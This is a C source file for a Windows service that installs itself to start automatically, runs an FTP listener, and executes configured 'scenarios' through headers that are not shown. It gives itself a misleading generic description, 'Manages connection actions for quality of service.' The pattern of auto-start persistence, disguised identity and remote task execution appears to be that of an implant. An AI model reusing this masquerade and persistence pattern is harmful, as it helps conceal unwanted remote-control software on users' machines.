#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN          // отключает устаревшие части Windows SDK

#include <winsock2.h>                // ОБЯЗАТЕЛЬНО до windows.h
#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include <shlwapi.h>
#include <time.h>
#include <locale.h>
#include <wininet.h>

#include "tp.h"
#include "pkt.h"
#include "ftp.h"
#include "svcconf.h"
#include "exectask.h"
#include "log.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
Config cfg;

#define BUFF_SZ (260)
#define PATH_SZ (MAX_PATH)

// int bibictivity() {
//     // TODO: реализация
//     return 0;
// }

int ConfSet(void)
{
    if (ConfParse(DFLT_CONF_FILE, &cfg)) {
        Log(L"[-] ConfParse failed\n");
        return 1;
    }
    if (!strcmp(cfg.conf, "")) {
        ConfInit(NULL);
        Log(L"[*] not found conf file: %s\n[*] set default conf\n", DFLT_CONF_FILE);
    }
    else {
        ConfInit(&cfg);
        Log(L"[*] set conf from file: %s\n", DFLT_CONF_FILE);
    }
    return 0;
}

int ListenSrv(void)
{
    Log(L"[*] FtpInit\n");
    if (FtpInit()) {
        Log(L"[-] FtpInit failed\n");
        return 1;
    }
    Log(L"[*] FtpListen\n");
    if (FtpListen()) {
        Log(L"[-] FtpListen failed\n");
        return 1;
    }
    Log(L"[*] FtpClose\n");
    if (FtpClose()) {
        Log(L"[-] FtpClose failed\n");
        return 1;   
    }
    return 0;
}


int InternetAvailable() {
    DWORD flags;
    if (InternetGetConnectedState(&flags, 0)) {
        return 0;
    }
    return 1;
}

int Activity(void) {
    int shots_cnt = 0;

    while (0 && InternetAvailable()) {
        shots_cnt++;
        Log(L"[*] net is not available. Sleep(60000). attempt %d\n", shots_cnt);
        Sleep(60000);
        if (shots_cnt == 5) {
            Log(L"[*] waited too long for the net\n");
            return 1;
        }
    }
    Log(L"[+] net is available\n");

    Log(L"[*] ListenSrv\n");
    if (ListenSrv()) {
        Log(L"[-] ListenSrv failed\n");
    }

    Log(L"[*] ConfSet\n");
    if (ConfSet()) {
        Log(L"[-] ConfSet failed\n");
    }

    if (STATE) {
        Log(L"[*] ExecScenario\n");
        if (ExecScenario()) {
            Log(L"[-] ExecScenario failed\n");
        }
    }

    return 0;
}

int InitService(void) {
    if (ConfSet()) {
        return 1;
    }
    return 0;
}

VOID WINAPI ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        Log(L"[*] SERVICE_CONTROL_STOP\n");
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);
        if (FtpClose()) {
            Log(L"[-] SERVICE_CONTROL_STOP: FtpClose failed\n");
        }
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        break;

    case SERVICE_CONTROL_SHUTDOWN:
        Log(L"[*] SERVICE_CONTROL_SHUTDOWN\n");
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);
        if (FtpClose()) {
            Log(L"[-] SERVICE_CONTROL_SHUTDOWN: FtpClose failed\n");
        }
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        break;

    default:
        SetServiceStatus(hStatus, &ServiceStatus);
        break;
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    Log(L"\n\n[*] Service starting\n");

    hStatus = RegisterServiceCtrlHandlerW(SVC_NAME, ControlHandler);
    if (!hStatus) {
        Log(L"[-] Handler registration failed\n");
        return;
    }

    ZeroMemory(&ServiceStatus, sizeof(ServiceStatus));
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(hStatus, &ServiceStatus);

    if (InitService()) {
        Log(L"[-] Service did not initialize\n");
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;
    }
    Log(L"[+] Service initialized\n");

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);
    Log(L"[*] Service running\n");

    Activity();

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
    Log(L"[*] Service stopped\n");
}

int InstallService(void) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        Log(L"[-] OpenSCManagerW failed\n");
        return 1;
    }

    wchar_t servicePath[MAX_PATH];
    if (!PathCombineW(servicePath, DFLT_SVC_PATH, DFLT_SVC_EXE)) {
        Log(L"[-] PathCombineW failed: %s : %s\n", DFLT_SVC_PATH, DFLT_SVC_EXE);
        return 1;
    }
    // GetModuleFileNameW(NULL, servicePath, MAX_PATH);

    SC_HANDLE hService = CreateServiceW(
        hSCManager, SVC_NAME, SVC_NAME, SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        servicePath, NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        CloseServiceHandle(hSCManager);
        Log(L"[-] CreateServiceW failed\n");
        return 1;
    }

    SERVICE_DESCRIPTIONW sd;
    sd.lpDescription = L"Manages connection actions for quality of service.";

    if (!ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd)) {
        Log(L"[-] ChangeServiceConfig2W failed\n");
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int RemoveService(void) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        Log(L"[-] OpenSCManagerW failed\n");
        return 1;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, SVC_NAME, DELETE);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        Log(L"[-] OpenServiceW failed: %s\n", SVC_NAME);
        return 1;
    }

    if (!DeleteService(hService)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        Log(L"[-] DeleteService failed\n");
        return 1;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int StartService_(void) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        return -1;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, SVC_NAME, SERVICE_START);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return -1;
    }

    if (!StartServiceW(hService, 0, NULL)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return -1;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int StopService(void) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        Log(L"[-] Can't open Service Manager\n");
        return -1;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, SVC_NAME, SERVICE_STOP);
    if (!hService) {
        Log(L"[-] Can't open service\n");
        CloseServiceHandle(hSCManager);
        return -1;
    }

    SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        Log(L"[-] Can't stop service\n");
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return -1;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    ConfInit(NULL);
    if (argc == 1) {
        SERVICE_TABLE_ENTRYW ServiceTable[] = {
            { SVC_NAME, (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
            { NULL, NULL }
        };
        StartServiceCtrlDispatcherW(ServiceTable);
    }
    else {
        wchar_t* cmd = argv[1];

        if (wcscmp(cmd, L"install") == 0) {
            Log(L"[*] svc install\n");
            return InstallService();
        }
        else if (wcscmp(cmd, L"remove") == 0) {
            Log(L"[*] svc remove\n");
            return RemoveService();
        }
        else if (wcscmp(cmd, L"start") == 0) {
            Log(L"[*] svc start\n");
            return StartService_();
        }
        else if (wcscmp(cmd, L"stop") == 0) {
            Log(L"[*] svc stop\n");
            return StopService();
        }
        else {
            wprintf(L"[-] Unknown command: %s\n", cmd);
        }
    }
    return 0;
}